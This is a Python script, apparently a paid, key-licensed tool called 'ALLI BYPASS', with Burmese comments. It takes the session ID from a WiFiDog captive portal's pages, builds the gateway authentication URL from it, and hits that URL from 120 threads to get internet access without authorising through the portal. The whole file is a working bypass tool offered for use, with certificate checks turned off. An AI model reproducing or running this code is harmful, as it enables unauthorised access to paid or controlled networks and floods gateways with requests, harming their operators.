import requests
import re
import urllib3
import time
import threading
import json
import os
import subprocess
import socket
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ===============================
# ⚙️ ADVANCED CONFIG
# ===============================
VALID_KEYS_URL = "https://raw.githubusercontent.com/Zyan091/my-database/main/key.txt"
LOCAL_DB = os.path.join(os.path.expanduser("~"), ".alli_vault.json")
PING_THREADS = 120 # လိုင်းငြိမ်ဖို့ Thread အရေအတွက် မြှင့်ထားသည်

R = Fore.RED; G = Fore.GREEN; C = Fore.CYAN; Y = Fore.YELLOW; M = Fore.MAGENTA; RS = Style.RESET_ALL
stop_event = threading.Event()

# ===============================
# 🔑 SECURITY SYSTEM
# ===============================
def get_hwid():
    try:
        user_id = subprocess.check_output('id -u', shell=True).decode().strip()
        return f"ZYAN-U0_A{user_id}-PRO"
    except: return "ZYAN-UNKNOWN-PRO"

def verify_access():
    my_id = get_hwid().strip().upper()
    now = datetime.now()

    if os.path.exists(LOCAL_DB):
        try:
            with open(LOCAL_DB, 'r') as f:
                saved = json.load(f)
                exp_time = datetime.strptime(saved['exp'], "%Y-%m-%d %H:%M")
                if saved['id'] == my_id and now <= exp_time:
                    print(f"{G}[✓] AUTO-LOGIN SUCCESSFUL!{RS}")
                    return True
        except: os.remove(LOCAL_DB)

    os.system('clear')
    banner()
    print(f"{C}DEVICE ID: {Y}{my_id}{RS}")
    u_key = input(f"{M}ENTER ACCESS KEY: {RS}").strip()
    
    if not u_key: return False

    print(f"{Y}[*] Synchronizing with cloud database...{RS}", end="\r")
    try:
        r = requests.get(f"{VALID_KEYS_URL}?t={time.time()}", timeout=15)
        if r.status_code == 200:
            for line in r.text.splitlines():
                if "|" in line:
                    parts = [p.strip() for p in line.split("|")]
                    if len(parts) >= 3:
                        k, i, d = parts[0], parts[1].upper(), parts[2]
                        if u_key == k and i == my_id:
                            exp_time = datetime.strptime(d, "%Y-%m-%d %H:%M")
                            if now <= exp_time:
                                with open(LOCAL_DB, 'w') as f:
                                    json.dump({'key':k, 'id':i, 'exp':d}, f)
                                print(f"\n{G}✅ ACCESS GRANTED! (EXP: {d}){RS}")
                                return True
            print(f"\n{R}❌ ACCESS DENIED: INVALID KEY OR ID{RS}")
        else: print(f"\n{R}❌ SERVER CONNECTION FAILED{RS}")
    except: print(f"\n{R}❌ NETWORK ERROR! CHECK CONNECTION{RS}")
    return False

# ===============================
# 🌐 CORE NETWORK ENGINE
# ===============================
def check_real_internet():
    try:
        # Google အပြင် DNS အလုပ်လုပ်မလုပ်ပါ စစ်ဆေးသည်
        socket.gethostbyname("www.google.com")
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def banner():
    print(f"""{M}
╔═════════════════════════════════════════════╗
║        ALLI BYPASS - ULTRA PRO V13          ║
║      STABLE / NO ERROR / HIGH SPEED         ║
╚═════════════════════════════════════════════╝{RS}""")

def high_speed_pulse(auth_link, sid):
    session = requests.Session()
    # Gateway က ပိုလက်ခံစေမည့် Header များ
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    })
    while not stop_event.is_set():
        try:
            # Adaptive Pulse: လိုင်းအခြေအနေပေါ်မူတည်ပြီး response စောင့်မည်
            resp = session.get(auth_link, timeout=5, verify=False)
            if resp.status_code == 200:
                print(f"{G}[⚡] ALLI PULSE: STABLE | SID: {sid[:8]}{RS}     ", end="\r")
            time.sleep(0.005) 
        except:
            time.sleep(1)
            break

def start_process():
    os.system('clear')
    banner()
    print(f"{C}[*] Turbo Engine Starting...{RS}")

    while not stop_event.is_set():
        session = requests.Session()
        try:
            # Captive Portal Check
            check = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            
            if check.status_code == 204 and "gstatic" in check.url:
                if check_real_internet():
                    print(f"{Y}[•] STATUS: ONLINE | MONITORING...{RS}      ", end="\r")
                    time.sleep(5); continue

            portal_url = check.url
            print(f"\n{C}[*] Portal Detected: {portal_url[:50]}...{RS}")
            
            # Step 1: Capture Session ID
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if sid:
                print(f"{G}[✓] SID CAPTURED: {Y}{sid}{RS}")
                # Step 2: Auto-Gateway Detection
                params = parse_qs(urlparse(portal_url).query)
                gw_ip = params.get('gw_address', ['192.168.110.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                
                auth_link = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}"
                
                # Step 3: Multi-Threaded Force Bypass
                print(f"{M}[🚀] LAUNCHING ULTRA PULSE ENGINE...{RS}")
                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_pulse, args=(auth_link, sid), daemon=True).start()
                
                # လိုင်းတည်ငြိမ်သွားသည်အထိ စောင့်ကြည့်မည်
                retry_count = 0
                while retry_count < 10:
                    if check_real_internet():
                        print(f"\n{G}✅ BYPASS SUCCESSFUL! ENJOY INTERNET.{RS}")
                        break
                    time.sleep(2)
                    retry_count += 1
                
                while check_real_internet(): time.sleep(10)
            else:
                print(f"{R}[!] FAILED TO CAPTURE SID. RETRYING...{RS}")
                time.sleep(3)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        if verify_access():
            start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{R}🛑 ENGINE STOPPED BY USER.{RS}")                                
